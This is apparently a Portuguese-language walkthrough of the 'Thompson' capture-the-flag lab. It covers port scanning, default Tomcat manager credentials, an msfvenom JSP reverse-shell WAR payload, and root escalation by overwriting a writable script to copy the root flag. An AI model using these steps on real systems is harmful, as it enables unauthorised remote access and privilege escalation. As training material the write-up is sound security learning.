# Thompson

* ### Scan de portas - Verificando quais portas estão abertas.

```bash
rustscan -a 10.10.123.160
```
![image](https://github.com/lufffe/Writeups/assets/90646635/21523a9d-03de-4048-9460-cd43c647e053)

![image](https://github.com/lufffe/Writeups/assets/90646635/7dd7718f-1f3d-4abc-90d4-b974e9852c55)

* ### Verificando se o nmap encontra mais portas abertas.
```bash
nmap -A 10.10.123.160
```
![image](https://github.com/lufffe/Writeups/assets/90646635/16172107-2e4a-4cfc-af72-55cc95ecb3df)

* ### Scan de Arquivos e Diretorios.
 ```bash 
 gobuster dir -u http://10.10.123.160:8080 -w ~/common.txt -t 100 --no-error
```
![image](https://github.com/lufffe/Writeups/assets/90646635/80d0344c-3cbf-44af-aef0-c349b6f1edcc)

* ### Dando uma olhada no browser, se você clicar em manager aparece a solicitação de login e senha.
![image](https://github.com/lufffe/Writeups/assets/90646635/43adc7df-8bf1-4e3a-afcd-00c330be6074)

* ### Pesquisa no google, credenciais default do tomcat e então
* ![image](https://github.com/lufffe/Writeups/assets/90646635/62bd345c-eeb7-4ca5-b5e0-e68dbc74bf30)

* ### Criando a reverse shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=9999 -f war -o rshell.war

* ### Subindo a verse 
![image](https://github.com/lufffe/Writeups/assets/90646635/6ba104d9-93a4-4ab9-af21-a95274a74f3a)

![image](https://github.com/lufffe/Writeups/assets/90646635/ca2393f2-ce1a-4431-a074-40ebb0e17185)


* ### Conseguindo a shell.
![image](https://github.com/lufffe/Writeups/assets/90646635/e66f1e4c-0c40-48bd-b717-505eab754720)

* ### Flag user
```bash 
tomcat@ubuntu:/home/jack$ cat user.txt
```
> #################################################

```bash 
tomcat@ubuntu:/home/jack$ ls -la
```
![image](https://github.com/lufffe/Writeups/assets/90646635/cec1011a-abab-4dd4-b891-711091940c5e)

```bash 
tomcat@ubuntu:/home/jack$ echo "cat /root/root.txt > test.txt" > id.sh
```

* ### Flag root
tomcat@ubuntu:/home/jack$ cat test.txt
cat test.txt
> ################################################# 
